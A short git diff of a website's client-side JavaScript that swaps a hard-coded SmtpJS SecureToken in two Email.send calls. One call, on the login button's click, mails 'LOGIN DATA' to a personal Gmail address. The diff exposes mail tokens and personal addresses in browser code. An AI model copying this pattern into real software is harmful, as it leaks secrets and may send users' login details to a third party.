@@ -111,7 +111,7 @@ LOGINBTN.addEventListener("click",function(){
     
     document.querySelector("#user").innerHTML = `<i class="ri-user-line"></i>` + msgName;
     Email.send({
-    SecureToken : "925d1fee-c803-4d93-a09c-c79ad4da638f",
+    SecureToken : "5ae85ede-0721-49f6-9dd2-ac4f42182fc7",
     To : 'azizansari8716@gmail.com',
     From : "azizansari8716@gmail.com",
     Subject : "LOGIN DATA/aziz",
@@ -151,7 +151,7 @@ LOGINBTN.addEventListener("click",function(){
     msgTextArea.value = ""
     
     Email.send({
-    SecureToken : "925d1fee-c803-4d93-a09c-c79ad4da638f",
+    SecureToken : "5ae85ede-0721-49f6-9dd2-ac4f42182fc7",
     To : 'mukhtar.alam458546@gmail.com',
     From : "azizansari8716@gmail.com",
     Subject : "MESSAGE FROM/aziz",
